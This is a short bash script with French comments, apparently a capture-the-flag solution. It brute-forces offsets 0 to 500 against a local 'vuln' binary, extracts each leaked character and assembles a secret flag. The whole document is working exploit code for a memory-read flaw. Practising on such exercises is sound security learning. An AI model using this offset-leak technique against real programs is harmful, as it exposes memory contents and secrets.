#!/usr/bin/env bash

# Script simple pour brute-forcer l'offset
# Assure-toi d'avoir compilé le programme "vuln" au préalable.

MAX_OFFSET=500
SECRET=""

for i in $(seq 0 $MAX_OFFSET); do
# On capture la sortie de ./vuln $i
OUTPUT=$(./../vuln "$i")

# Ex: "[*] Lecture à l'offset 100 : 0x46 ('F')"
# On va extraire le caractère qui est entre parenthèses
# On peut faire ça avec une petite astuce sed/grep/awk
CHAR=$(echo "$OUTPUT" | awk -F"'" '{print $2}')

# On peut concaténer dans SECRET (ou un buffer) si c'est imprimable
# ici, on va juste chercher le motif "FLAG"
SECRET+=$CHAR

# Si on voit apparaître "FLAG{" dans SECRET, on continue pour la suite
if [[ $SECRET == *"FLAG{"* ]]; then
# On imprime quand même ce qu'on a pour debug
echo "[DEBUG] offset=$i -> $CHAR => $SECRET"
fi
done

# A la fin, on affiche ce qu'on a accumulé
echo "SECRET POTENTIEL : $SECRET"

